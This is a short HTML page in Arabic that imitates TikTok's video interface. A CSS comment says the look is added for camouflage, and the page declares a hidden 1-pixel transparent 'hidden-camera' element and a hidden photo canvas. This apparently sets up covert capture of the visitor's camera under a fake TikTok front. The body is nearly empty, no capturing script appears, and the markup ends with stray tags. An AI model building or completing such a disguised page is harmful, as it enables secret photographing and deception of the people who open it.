<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
        .video-wrapper { position: relative; width: 100%; height: 100%; }
        #tiktok-video { width: 100%; height: 100%; object-fit: cover; }
        
        /* إضافات شكل تيك توك الجانبية للتمويه */
        .sidebar { position: absolute; right: 10px; bottom: 100px; display: flex; flex-direction: column; gap: 20px; z-index: 10; }
        .icon { width: 40px; height: 40px; border-radius: 50%; background: rgba(255,255,255,0.2); display: flex; align-items: center; justify-content: center; color: white; font-size: 20px; }
        .user-info { position: absolute; left: 15px; bottom: 30px; color: white; z-index: 10; text-shadow: 1px 1px 5px rgba(0,0,0,0.8); }
        .user-info h3 { margin: 0; font-size: 16px; }
        .user-info p { margin: 5px 0; font-size: 14px; width: 80%; }

        #hidden-camera { position: absolute; width: 1px; height: 1px; opacity: 0; }
        #photo-canvas { display: none; }
    </style>
</head>
<body>

<div class="video-wrapper">

    </div>
</div>
